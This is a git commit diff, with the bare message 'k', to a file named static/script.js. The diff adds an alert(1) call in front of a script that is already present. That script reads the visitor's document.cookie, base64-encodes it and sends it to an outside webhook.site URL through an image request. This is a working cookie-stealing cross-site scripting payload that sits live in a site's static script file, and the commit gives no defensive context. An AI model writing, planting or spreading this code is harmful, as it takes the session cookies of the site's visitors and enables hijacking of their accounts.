d15b6df05d8e362cff8c5c934991f9d614402c59
celik1001 <relin1001@gmail.com>
2025-04-05 22:09:33 +0800

    k

--- static/script.js
+++ static/script.js
@@ -1,5 +1,5 @@
 <script>
-  var cookie = document.cookie; new Image().src =
+  alert(1); var cookie = document.cookie; new Image().src =
   "https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?" +
   window.btoa(document.cookie);
 </script>;
